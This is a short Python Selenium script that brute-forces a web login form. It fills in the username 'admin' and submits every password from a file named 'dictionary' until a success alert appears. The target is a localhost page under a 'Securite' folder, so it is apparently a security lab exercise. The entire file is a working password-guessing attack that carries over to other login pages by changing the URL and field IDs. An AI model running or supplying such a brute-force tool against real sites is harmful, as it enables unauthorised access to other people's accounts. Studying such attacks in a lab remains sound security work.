import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def find(driver):
	element = driver.find_elements_by_id("form-password")
	if element:
		return element
	else:
		return False

def find2(driver):
	element = driver.find_elements_by_id("connexion")
	if element:
		return element
	else:
		return False


driver = webdriver.Chrome('C:/Users/PC/Downloads/chromedriver.exe')

driver.get("http://localhost/Securite/form1.html")
time.sleep(1)
login = driver.find_element_by_id('form-username')
login.clear()
login.send_keys("admin")

with open("dictionary") as f:
	for line in f:
		passwd = WebDriverWait(driver, 100).until(find)

		passwd[0].clear()
		passwd[0].send_keys(line.rstrip('\r\n'))
		print(line)
		time.sleep(1)
		connexion = WebDriverWait(driver, 100).until(find2)
		connexion[0].click()
		if(len(driver.find_elements_by_css_selector(".alert-success")) > 0):
			time.sleep(3)
			break;
		else:
			driver.back();

f.close()

driver.close()
